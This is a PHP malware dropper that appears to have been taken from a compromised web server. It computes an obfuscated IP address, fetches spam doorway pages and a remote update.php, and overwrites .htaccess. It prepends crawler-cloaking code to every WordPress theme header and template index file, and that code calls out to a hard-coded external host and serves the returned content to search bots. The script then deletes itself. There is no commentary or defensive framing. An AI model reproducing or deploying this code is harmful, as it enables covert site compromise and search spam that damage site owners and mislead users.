<?php
$scriptname= str_replace("/", "", $_SERVER["SCRIPT_NAME"]);
$p1 = 1+2+2+round(cos(90)); $p2 = 10+5+10+10+10+round(cos(90)); $p3 = 10+20+20+20+9; $p4 = 1+2+2+5+5; $adddr = $p1.".".$p2.".".$p3.".".$p4;

$let = array (q,w,e,r,t,y,u,i,o,p,a,s,d,f,g,h,j,k,l,z,x,c,v,b,n,m,q,w,e,r,t,y,u,i,o,p,a,s,d,f,g,h,j,k,l,z,x,c,v,b,n,m);    
$dirname='';    
for ($ns=1;$ns<rand(4,8);$ns++)     
{     
$r = rand (0,count($let)-1);     
$dirname .= $let[$r];     
}  


mkdir("$dirname", 0777);

if (file_exists ($dirname))
{
	mkdir($dirname."/yvsdbh35", 0777);
	mkdir($dirname."/papkaa17", 0777);

	for($nnn=1;$nnn<10;$nnn++)
{
 $ch = curl_init();  
curl_setopt($ch, CURLOPT_URL, "http://$adddr/doorgen2/$nnn.txt"); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch, CURLOPT_USERAGENT,'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.6) Gecko/20060928 Firefox/1.5.0.6');
$result = curl_exec($ch); 
curl_close($ch);
$z = fopen("$dirname/papkaa17/$nnn.txt", "w");
fwrite($z, $result);
fclose($z);
}

 $ch = curl_init();  
curl_setopt($ch, CURLOPT_URL, "http://$adddr/doorgen2/update.txt"); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch, CURLOPT_USERAGENT,'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.6) Gecko/20060928 Firefox/1.5.0.6');
$result = curl_exec($ch); 
curl_close($ch);
$z = fopen("$dirname/update.php", "w");
fwrite($z, $result);
fclose($z);
$z = fopen("$dirname/yvsdbh35/update.txt", "w");
fwrite($z, $result);
fclose($z);

 $ch = curl_init();  
curl_setopt($ch, CURLOPT_URL, "http://$adddr/doorgen2/sexthe.txt"); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch, CURLOPT_USERAGENT,'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.6) Gecko/20060928 Firefox/1.5.0.6');
$result = curl_exec($ch); 
curl_close($ch);

$z = fopen("$dirname/yvsdbh35/sexthe.php", "w");
fwrite($z, $result);
fclose($z);

$url = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];

$string = $url;
$string = explode("/", $string);

$url = "";

$n=1;
$end = sizeof($string)-1;
foreach ($string as $a) 
{
$url .= $a."/";
$n++;
if ($n > $end ) break;
}
echo "<b><b><b>$url$dirname</b></b></b>";
}
/*
	$dirs = scandir(".");
	foreach ($dirs as $dir)
	{
		if ((file_exists("$dir/.htaccess")) and ((file_exists("$dir/update.php")) OR (file_exists("$dir/update.php.suspected")))) 
		{
$out = fopen("$dir/.htaccess", "w");

fwrite ($out, "RewriteEngine On 
RewriteRule ^([A-Za-z0-9-]+).html$ update.php?hl=$1 [L]");
if (file_exists("$dir/update.php.suspected")) rename("$dir/update.php.suspected", "$dir/update.php");
		}
	}
*/
	
	$outht = fopen(".htaccess", "w");
fwrite($outht, "# BEGIN WordPress
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
RewriteRule ^index\.php$ - [L]
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule . /index.php [L]
</IfModule>
 
# END WordPress");
fclose($outht);

@unlink(sys_get_temp_dir());


$code = '


<?php
$user_agent_to_filter = array( \'#Ask\s*Jeeves#i\', \'#HP\s*Web\s*PrintSmart#i\', \'#HTTrack#i\', \'#IDBot#i\', \'#Indy\s*Library#\',
                               \'#ListChecker#i\', \'#MSIECrawler#i\', \'#NetCache#i\', \'#Nutch#i\', \'#RPT-HTTPClient#i\',
                               \'#rulinki\.ru#i\', \'#Twiceler#i\', \'#WebAlta#i\', \'#Webster\s*Pro#i\',\'#www\.cys\.ru#i\',
                               \'#Wysigot#i\', \'#Yahoo!\s*Slurp#i\', \'#Yeti#i\', \'#Accoona#i\', \'#CazoodleBot#i\',
                               \'#CFNetwork#i\', \'#ConveraCrawler#i\',\'#DISCo#i\', \'#Download\s*update#i\', \'#FAST\s*MetaWeb\s*Crawler#i\',
                               \'#Flexum\s*spider#i\', \'#Gigabot#i\', \'#HTMLParser#i\', \'#ia_archiver#i\', \'#ichiro#i\',
                               \'#IRLbot#i\', \'#Java#i\', \'#km\.ru\s*bot#i\', \'#kmSearchBot#i\', \'#libwww-perl#i\',
                               \'#Lupa\.ru#i\', \'#LWP::Simple#i\', \'#lwp-trivial#i\', \'#Missigua#i\', \'#MJ12bot#i\',
                               \'#msnbot#i\', \'#msnbot-media#i\', \'#Offline\s*Explorer#i\', \'#OmniExplorer_Bot#i\',
                               \'#PEAR#i\', \'#psbot#i\', \'#Python#i\', \'#rulinki\.ru#i\', \'#SMILE#i\',
                               \'#Speedy#i\', \'#Teleport\s*Pro#i\', \'#TurtleScanner#i\', \'#User-Agent#i\', \'#voyager#i\',
                               \'#Webalta#i\', \'#WebCopier#i\', \'#WebData#i\', \'#WebZIP#i\', \'#Wget#i\',
                               \'#Yandex#i\', \'#Yanga#i\', \'#Yeti#i\',\'#msnbot#i\',
                               \'#spider#i\', \'#yahoo#i\', \'#jeeves#i\' ,\'#google#i\' ,\'#altavista#i\',
                               \'#scooter#i\' ,\'#av\s*fetch#i\' ,\'#asterias#i\' ,\'#spiderthread revision#i\' ,\'#sqworm#i\',
                               \'#ask#i\' ,\'#lycos.spider#i\' ,\'#infoseek sidewinder#i\' ,\'#ultraseek#i\' ,\'#polybot#i\',
                               \'#webcrawler#i\', \'#robozill#i\', \'#gulliver#i\', \'#architextspider#i\', \'#yahoo!\s*slurp#i\',
                               \'#charlotte#i\', \'#ngb#i\', \'#BingBot#i\' ) ;

if ( !empty( $_SERVER[\'HTTP_USER_AGENT\'] ) && ( FALSE !== strpos( preg_replace( $user_agent_to_filter, \'-NO-WAY-\', $_SERVER[\'HTTP_USER_AGENT\'] ), \'-NO-WAY-\' ) ) ){
    $isbot = 1;
	}

if( FALSE !== strpos( gethostbyaddr($_SERVER[\'REMOTE_ADDR\']), \'google\')) 
{
    $isbot = 1;
}

if(@$isbot){

$_SERVER[HTTP_USER_AGENT] = str_replace(" ", "-", $_SERVER[HTTP_USER_AGENT]);
$ch = curl_init();    
    curl_setopt($ch, CURLOPT_URL, "http://173.236.65.24/cakes/?useragent=$_SERVER[HTTP_USER_AGENT]&domain=$_SERVER[HTTP_HOST]");   
    $result = curl_exec($ch);       
curl_close ($ch);  

	echo $result;
}
?>';


if (file_exists("wp-content"))
{
if (file_exists("wp-content/themes"))
{
	$dirs = scandir("wp-content/themes");
	foreach ($dirs as $dir)
	{
		if ((is_dir("wp-content/themes/$dir")) AND ($dir !== ".") AND ($dir !== "..")) 
		{
			if (file_exists("wp-content/themes/$dir/header.php")) 
			{
		   				  $file = fopen("wp-content/themes/".$dir."/header.php", "r");  
                          $buffer = fread($file, filesize("wp-content/themes/".$dir."/header.php")); 
                          fclose($file);	
               if (eregi('173.236.65.24', $buffer)==0) 
               { 
				 
						 	$in = fopen("wp-content/themes/".$dir."/header.php", "w");
				             fwrite($in, $code);
			                 fwrite($in, $buffer);
				             fclose($in);
				/*		 
                   $in = fopen("wp-content/themes/$dir/header.php", "a");
				   fwrite($in, $code);
				   fclose($in);
				   */
               }
			}
		}
	}
}
}

if (file_exists("templates"))
{
	 $dirs = scandir("templates");
	 	foreach ($dirs as $dir)
	     {
		         if ((is_dir("templates/$dir")) AND ($dir !== ".") AND ($dir !== "..")) 
		          {
					  if (file_exists("templates/".$dir."/index.php")) 
					  {
						  $file = fopen("templates/".$dir."/index.php", "r");  
                          $buffer = fread($file, filesize("templates/".$dir."/index.php")); 
                          fclose($file);	
                            if (eregi('173.236.65.24', $buffer)==0) 
                                   {
					         $in = fopen("templates/".$dir."/index.php", "w");
				             fwrite($in, $code);
			                 fwrite($in, $buffer);
				             fclose($in);
 								   }									   
					  }
		          }
	     }
}


@unlink($scriptname);



?>